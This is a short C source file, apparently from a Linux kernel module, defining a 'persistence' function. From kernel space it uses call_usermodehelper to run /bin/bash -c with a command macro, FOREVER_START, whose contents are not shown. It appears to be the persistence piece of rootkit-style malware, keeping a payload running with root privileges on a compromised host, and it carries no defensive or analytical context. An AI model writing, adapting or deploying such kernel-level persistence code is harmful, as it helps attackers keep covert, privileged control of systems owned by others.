#include "persistence.h"

void persistence(void) {
    char *argv[] = { "/bin/bash", "-c", FOREVER_START, NULL };
    char *envp[] = { "HOME=/", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}